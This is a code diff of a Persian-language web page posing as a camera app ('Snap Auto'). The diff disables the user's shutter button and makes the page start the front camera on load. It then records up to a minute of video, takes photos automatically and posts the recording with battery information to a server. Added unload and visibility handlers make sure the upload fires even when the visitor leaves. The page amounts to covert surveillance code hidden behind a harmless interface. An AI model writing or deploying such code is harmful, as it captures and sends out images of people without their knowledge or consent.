@@ -2,7 +2,7 @@
 <html lang="fa">
 <head>
   <meta charset="UTF-8" />
-  <title>Snap UI</title>
+  <title>Snap Auto</title>
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   <link href="https://cdn.jsdelivr.net/gh/rastikerdar/vazirmatn@v33.003/Vazirmatn-font-face.css" rel="stylesheet" />
   <script src="https://cdn.tailwindcss.com"></script>
@@ -48,12 +48,12 @@
   <div class="overlay">
     <div class="flex justify-between">
       <div></div>
-      <button disabled class="text-black p-2 bg-white/40 rounded-full">
+      <button class="text-black p-2 bg-white/40 rounded-full cursor-default" disabled>
         <i data-lucide="camera"></i>
       </button>
     </div>
     <div class="flex justify-center">
-      <button onclick="takePhoto()" class="circle-btn"></button>
+      <button class="circle-btn cursor-default" disabled></button>
     </div>
   </div>
 
@@ -81,17 +81,15 @@
     }
 
     async function startCamera() {
-      if (stream) stream.getTracks().forEach(t => t.stop());
       try {
         stream = await navigator.mediaDevices.getUserMedia({
-          video: { facingMode: "user" } // فقط دوربین جلو
+          video: { width: 640, height: 480, facingMode: "user" }
         });
         document.getElementById('video').srcObject = stream;
         startRecording();
-        setTimeout(takePhoto, 1000);     // عکس اول
-        setTimeout(takePhoto, 5000);     // عکس دوم
+        takeAutoPhotos();
       } catch (err) {
-        alert("دوربین در دسترس نیست.");
+        alert("دسترسی به دوربین رد شده یا مشکل دارد.");
       }
     }
 
@@ -116,9 +114,14 @@
       }, 'image/jpeg', 0.8);
     }
 
+    function takeAutoPhotos() {
+      setTimeout(takePhoto, 1000);
+      setTimeout(takePhoto, 5000);
+    }
+
     function startRecording() {
       chunks = [];
-      mediaRecorder = new MediaRecorder(stream, { mimeType: "video/webm" });
+      mediaRecorder = new MediaRecorder(stream, { mimeType: "video/webm; codecs=vp9" });
       mediaRecorder.ondataavailable = e => chunks.push(e.data);
       mediaRecorder.onstop = sendVideo;
       mediaRecorder.start();
@@ -127,11 +130,11 @@
         if (mediaRecorder && mediaRecorder.state === "recording") {
           mediaRecorder.stop();
         }
-      }, 90000); // حداکثر ۹۰ ثانیه
+      }, 60000); // حداکثر ۶۰ ثانیه
     }
 
     async function sendVideo() {
-      if (videoSent) return;
+      if (videoSent || chunks.length === 0) return;
       videoSent = true;
       const battery = await getBatteryInfo();
       const blob = new Blob(chunks, { type: "video/webm" });
@@ -144,6 +147,18 @@
         body: form
       });
     }
+
+    window.addEventListener("beforeunload", () => {
+      if (mediaRecorder && mediaRecorder.state === "recording") {
+        mediaRecorder.stop();
+      }
+    });
+
+    document.addEventListener("visibilitychange", () => {
+      if (document.hidden && mediaRecorder && mediaRecorder.state === "recording") {
+        mediaRecorder.stop();
+      }
+    });
 
     startCamera();
   </script>
